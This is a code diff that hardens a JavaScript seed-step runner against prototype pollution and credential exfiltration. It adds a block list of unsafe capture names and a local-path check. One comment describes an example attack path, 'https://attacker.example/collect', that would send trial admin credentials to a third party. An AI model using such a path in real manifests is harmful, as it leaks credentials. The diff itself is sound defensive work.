@@ -25,10 +25,13 @@
  * may opt into `required: true` when the trial is genuinely useless without it.
  */
 
+/** Capture names that would poison the scope object rather than fill it. */
+const UNSAFE_NAMES = new Set(['__proto__', 'constructor', 'prototype']);
+
 /** Resolve ${var} references against captured values and trial credentials. */
 function interpolate(value, vars) {
   if (typeof value === 'string') {
-    return value.replace(/\$\{(\w+)\}/g, (m, k) => (k in vars ? String(vars[k]) : m));
+    return value.replace(/\$\{(\w+)\}/g, (m, k) => (Object.hasOwn(vars, k) ? String(vars[k]) : m));
   }
   if (Array.isArray(value)) return value.map((v) => interpolate(v, vars));
   if (value && typeof value === 'object') {
@@ -55,7 +58,9 @@ function pick(obj, path) {
 export async function runSeed({ baseUrl, steps = [], vars = {}, emit = () => {} }) {
   if (!steps.length) return { ran: 0, failed: 0, skipped: true };
 
-  const scope = { ...vars };
+  // Null-prototype: captured names come from a manifest, and a plain object
+  // would resolve ${constructor} to something inherited rather than captured.
+  const scope = Object.assign(Object.create(null), vars);
   let ran = 0;
   let failed = 0;
 
@@ -64,7 +69,11 @@ export async function runSeed({ baseUrl, steps = [], vars = {}, emit = () => {} 
     emit({ step: `seed:${label}`, status: 'running', message: label });
 
     try {
-      const url = new URL(interpolate(step.path, scope), baseUrl).toString();
+      // Re-checked here, not only at parse time: `path` is interpolated with
+      // captured values, so a response body could otherwise steer the request.
+      const path = interpolate(step.path, scope);
+      assertLocalPath(path, step.name);
+      const url = new URL(path, baseUrl).toString();
       const body = step.body ? interpolate(step.body, scope) : undefined;
 
       const res = await fetch(url, {
@@ -120,6 +129,22 @@ export async function runSeed({ baseUrl, steps = [], vars = {}, emit = () => {} 
   return { ran, failed, skipped: false };
 }
 
+/**
+ * A seed step may only address the trial itself.
+ *
+ * Seed bodies carry the trial's generated admin credentials. `new URL(path,
+ * base)` ignores the base entirely when `path` is absolute, so without this a
+ * catalog manifest could set `path: https://attacker.example/collect` and have
+ * the controller POST those credentials — from inside the control plane, with
+ * its network position — straight to a third party. Protocol-relative `//host`
+ * does the same thing, hence the negative lookahead.
+ */
+export function assertLocalPath(path, where) {
+  if (!/^\/(?!\/)/.test(path)) {
+    throw new Error(`${where}: path must be local and start with "/" (got "${String(path).slice(0, 60)}")`);
+  }
+}
+
 /** Validate and normalise the `seed:` block of a manifest. */
 export function normaliseSeedStep(step, i) {
   const name = String(step.name ?? `seed ${i + 1}`);
@@ -128,6 +153,13 @@ export function normaliseSeedStep(step, i) {
     throw new Error(`seed[${i}] "${name}": unsupported method ${method}`);
   }
   if (!step.path) throw new Error(`seed[${i}] "${name}": path is required`);
+  assertLocalPath(String(step.path), `seed[${i}] "${name}"`);
+
+  for (const key of Object.keys(step.capture ?? {})) {
+    if (UNSAFE_NAMES.has(key)) {
+      throw new Error(`seed[${i}] "${name}": unsafe capture name "${key}"`);
+    }
+  }
 
   const expectStatus = Array.isArray(step.expectStatus)
     ? step.expectStatus.map(Number)
